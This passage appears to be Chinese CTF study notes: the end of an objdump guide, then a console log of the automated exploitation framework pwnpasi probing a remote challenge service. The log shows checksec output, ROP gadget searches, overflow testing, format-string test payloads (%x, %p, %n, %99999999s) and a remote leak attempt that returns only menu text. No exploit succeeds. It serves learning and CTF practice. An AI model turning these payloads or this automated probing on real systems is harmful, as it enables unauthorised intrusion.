   # 导出分析结果后再用objdump
   ```

---

### **性能优化建议**

1. 大文件处理：
   ```bash
   objdump -d large_binary | less
   ```

2. 批量处理脚本：
   ```bash
   for f in *.o; do
     objdump -d $f > ${f%.o}.asm
   done
   ```

---

通过掌握这些命令组合，您可以应对：漏洞分析、逆向工程、编译器行为验证、ABI研究等多种二进制分析场景。建议结合`readelf`、`nm`、`gdb`等工具进行协同分析。




----

pwn的第一道题，尝试使用自动化AI工具pwnpasi
`python /Users/apple/github/pwnpasi/pwnpasi.py -l hello -libc libc-2.23.so`

```
(base) apple@MacBook-Air-2 attachments % python /Users/apple/github/pwnpasi/pwnpasi.py -l hello -libc libc-2.23.so -ip 61.147.171.35 -p 58530
/Users/apple/github/pwnpasi/pwnpasi.py:101: SyntaxWarning: invalid escape sequence '\ '
  """


        ____                 ____            _
       |  _ \ __      ___ _|  _ \ __ _ ___(_)
       | |_) |\ \ /\ / / '_ \ |_) / _` / __| |
       |  __/  \ V  V /| | | |  __/ (_| \__ \ |
       |_|      \_/\_/ |_| |_|_|   \__,_|___/_|

    Automated Binary Exploitation Framework v3.1
    by Security Research Team
    https://github.com/heimao-box/pwnpasi

[*] [23:19:35] target binary: ./hello
[*] [23:19:35] remote target: 61.147.171.35:58530
[*] [23:19:35] using custom libc: libc-2.23.so

┌────────────────────────────────────────────────────────────┐
│                   BINARY ANALYSIS PHASE                    │
└────────────────────────────────────────────────────────────┘
[*] [23:19:35] setting executable permissions
chmod: Invalid file mode: +755
[*] [23:19:35] collecting binary security information
[*] [23:19:35] collecting binary information

┌────────────────────────────────────────────────────────────┐
│                  BINARY SECURITY ANALYSIS                  │
└────────────────────────────────────────────────────────────┘
    Feature     |     Status      |   Risk Level
---------------------------------------------------
     RELRO      |  Partial RELRO  |     MEDIUM
 Stack Canary   |  Canary found   |       LOW
    NX Bit      |   NX enabled    |       LOW
      PIE       |   PIE enabled   |       LOW
 RWX Segments   |     Unknown     |       LOW


┌────────────────────────────────────────────────────────────┐
│                     FUNCTION ANALYSIS                      │
└────────────────────────────────────────────────────────────┘
[*] [23:19:36] scanning PLT functions
[*] [23:19:36] analyzing PLT table and available functions

┌────────────────────────────────────────────────────────────┐
│                     FUNCTION ANALYSIS                      │
└────────────────────────────────────────────────────────────┘
   Function     |     Address     |    Available
---------------------------------------------------
     write      |       N/A       |       NO
     puts       | 0000000000000930 |       YES
    printf      | 0000000000000950 |       YES
     main       |       N/A       |       NO
    system      |       N/A       |       NO
   backdoor     |       N/A       |       NO
  callsystem    |       N/A       |       NO
[*] [23:19:37]

┌────────────────────────────────────────────────────────────┐
│                    ROP GADGET DISCOVERY                    │
└────────────────────────────────────────────────────────────┘
[*] [23:19:37] searching for x64 ROP gadgets
[*] [23:19:37] searching for ROP gadgets (x64)

┌────────────────────────────────────────────────────────────┐
│                     ROP GADGETS (x64)                      │
└────────────────────────────────────────────────────────────┘
  Gadget Type   |     Address     |   Instruction
---------------------------------------------------
    pop rdi     | 0x0000000000001303 |  pop rdi; ret
pop rsi (multi) | 0x0000000000001301 | pop rsi; pop ...; ret
      ret       | 0x0000000000000901 |       ret
[*] [23:19:39]

┌────────────────────────────────────────────────────────────┐
│                    PADDING CALCULATION                     │
└────────────────────────────────────────────────────────────┘
[*] [23:19:39] performing dynamic stack overflow testing
[*] [23:19:39] testing for stack overflow vulnerability

┌────────────────────────────────────────────────────────────┐
│                  STACK OVERFLOW DETECTION                  │
└────────────────────────────────────────────────────────────┘
[*] Testing overflow: [██████████████████████████████] 100%[*] [23:21:40]
[!] [23:21:40] no stack overflow vulnerability detected
[*] [23:21:40] analyzing vulnerable functions

┌────────────────────────────────────────────────────────────┐
│                      STRING ANALYSIS                       │
└────────────────────────────────────────────────────────────┘
[*] [23:21:40] searching for /bin/sh string in binary
[*] [23:21:40] checking for /bin/sh string
[!] [23:21:41] /bin/sh string not found in binary

┌────────────────────────────────────────────────────────────┐
│                 CANARY PROTECTION DETECTED                 │
└────────────────────────────────────────────────────────────┘
[!] [23:21:41] canary protection is enabled
[*] [23:21:41] testing for format string vulnerability to bypass canary
[*] [23:21:41] testing for format string vulnerabilities

┌────────────────────────────────────────────────────────────┐
│              FORMAT STRING VULNERABILITY TEST              │
└────────────────────────────────────────────────────────────┘
   Test Case    |     Result      |     Status
---------------------------------------------------
%x%x%x%x%x%x%x%x%x%x |      ERROR      |     UNKNOWN
%p%p%p%p%p%p%p%p%p%p |      ERROR      |     UNKNOWN
%s%s%s%s%s%s%s%s%s%s |      ERROR      |     UNKNOWN
  %n%n%n%n%n    |      ERROR      |     UNKNOWN
 AAAA%x%x%x%x   |      ERROR      |     UNKNOWN
  %99999999s    |      ERROR      |     UNKNOWN

[!] [23:21:41] no format string vulnerability detected
[-] [23:21:41] no format string vulnerability found for canary bypass
[!] [23:21:41] canary protection cannot be bypassed with current methods
[*] [23:21:41] testing for stack overflow vulnerability

┌────────────────────────────────────────────────────────────┐
│                  STACK OVERFLOW DETECTION                  │
└────────────────────────────────────────────────────────────┘
[*] Testing overflow: [██████████████████████████████] 100%[*] [23:23:57]
[!] [23:23:57] no stack overflow vulnerability detected
[!] [23:23:57] no stack overflow vulnerability detected through dynamic testing

┌────────────────────────────────────────────────────────────┐
│                     EXPLOITATION PHASE                     │
└────────────────────────────────────────────────────────────┘
[*] [23:23:57] initializing exploitation attempts

┌────────────────────────────────────────────────────────────┐
│            FORMAT STRING VULNERABILITY ANALYSIS            │
└────────────────────────────────────────────────────────────┘
[*] [23:23:57] testing for format string vulnerability
[*] [23:23:57] testing for format string vulnerabilities

┌────────────────────────────────────────────────────────────┐
│              FORMAT STRING VULNERABILITY TEST              │
└────────────────────────────────────────────────────────────┘
   Test Case    |     Result      |     Status
---------------------------------------------------
%x%x%x%x%x%x%x%x%x%x |      ERROR      |     UNKNOWN
%p%p%p%p%p%p%p%p%p%p |      ERROR      |     UNKNOWN
%s%s%s%s%s%s%s%s%s%s |      ERROR      |     UNKNOWN
  %n%n%n%n%n    |      ERROR      |     UNKNOWN
 AAAA%x%x%x%x   |      ERROR      |     UNKNOWN
  %99999999s    |      ERROR      |     UNKNOWN

[!] [23:23:57] no format string vulnerability detected
[!] [23:23:57] /bin/sh string not found in binary

┌────────────────────────────────────────────────────────────┐
│             REMOTE FORMAT STRING EXPLOITATION              │
└────────────────────────────────────────────────────────────┘
[*] [23:23:57] targeting remote service at 61.147.171.35:58530
[!] [23:23:57] system function or /bin/sh not available, attempting string leak only

┌────────────────────────────────────────────────────────────┐
│                FORMAT STRING LEAK - Remote                 │
└────────────────────────────────────────────────────────────┘
[*] [23:23:57] leaking program strings from 61.147.171.35:58530
[*] [23:23:58] offset 0: b'-------PhoneRecord-----------'
[*] [23:23:58] offset 1: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:23:58] offset 2: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:23:58] offset 3: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:23:58] offset 4: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:23:59] offset 5: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:23:59] offset 6: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:23:59] offset 7: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:23:59] offset 8: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:23:59] offset 9: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:23:59] offset 10: b'-------PhoneRecord-----------'
[*] [23:24:00] offset 11: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:00] offset 12: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>bad choice!-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:00] offset 13: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:00] offset 14: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:01] offset 15: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:01] offset 16: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:01] offset 17: b'-------PhoneRecord-----------'
[*] [23:24:01] offset 18: b'-------PhoneRecord-----------'
[*] [23:24:01] offset 19: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:01] offset 20: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:02] offset 21: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:02] offset 22: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:02] offset 23: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:02] offset 24: b'-------PhoneRecord-----------'
[*] [23:24:02] offset 25: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:02] offset 26: b'-------PhoneRecord-----------'
[*] [23:24:03] offset 27: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:03] offset 28: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:03] offset 29: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:03] offset 30: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:03] offset 31: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:03] offset 32: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:04] offset 33: b'-------PhoneRecord-----------'
[*] [23:24:04] offset 34: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:04] offset 35: b'-------PhoneRecord-----------'
[*] [23:24:04] offset 36: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:04] offset 37: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:04] offset 38: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:04] offset 39: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:05] offset 40: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:05] offset 41: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:05] offset 42: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:05] offset 43: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:05] offset 44: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:05] offset 45: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:06] offset 46: b'-------PhoneRecord-----------'
[*] [23:24:06] offset 47: b'-------PhoneRecord-----------'
[*] [23:24:06] offset 48: b'-------PhoneRecord-----------'
[*] [23:24:06] offset 49: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:06] offset 50: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:06] offset 51: b'-------PhoneRecord-----------'
[*] [23:24:07] offset 52: b'-------PhoneRecord-----------'
[*] [23:24:07] offset 53: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:07] offset 54: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:07] offset 55: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:07] offset 56: b'-------PhoneRecord-----------'
[*] [23:24:07] offset 57: b'-------PhoneRecord-----------'
[*] [23:24:07] offset 58: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:07] offset 59: b'-------PhoneRecord-----------'
[*] [23:24:08] offset 60: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:08] offset 61: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:08] offset 62: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:08] offset 63: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:08] offset 64: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:08] offset 65: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:08] offset 66: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:08] offset 67: b'-------PhoneRecord-----------'
[*] [23:24:09] offset 68: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:09] offset 69: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:09] offset 70: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:10] offset 71: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:10] offset 72: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:10] offset 73: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:10] offset 74: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:10] offset 75: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:11] offset 76: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:11] offset 77: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:11] offset 78: b'-------PhoneRecord-----------'
[*] [23:24:11] offset 79: b'-------PhoneRecord-----------'
[*] [23:24:11] offset 80: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:11] offset 81: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:11] offset 82: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:11] offset 83: b'-------PhoneRecord-----------'
[*] [23:24:12] offset 84: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:12] offset 85: b'-------PhoneRecord-----------'
[*] [23:24:12] offset 86: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:12] offset 87: b'-------PhoneRecord-----------'
[*] [23:24:12] offset 88: b'-------PhoneRecord-----------'
[*] [23:24:12] offset 89: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:12] offset 90: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:12] offset 91: b'-------PhoneRecord-----------'
[*] [23:24:13] offset 92: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:13] offset 93: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:13] offset 94: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:13] offset 95: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:13] offset 96: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:13] offset 97: b'-------PhoneRecord-----------'
[*] [23:24:13] offset 98: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
[*] [23:24:13] offset 99: b'-------PhoneRecord-----------\n-------1.Add Record----------\n-------2.Delete Record-------\n-------3.Show Record---------\n-------4.Edit Record---------\nyour choice>>'
```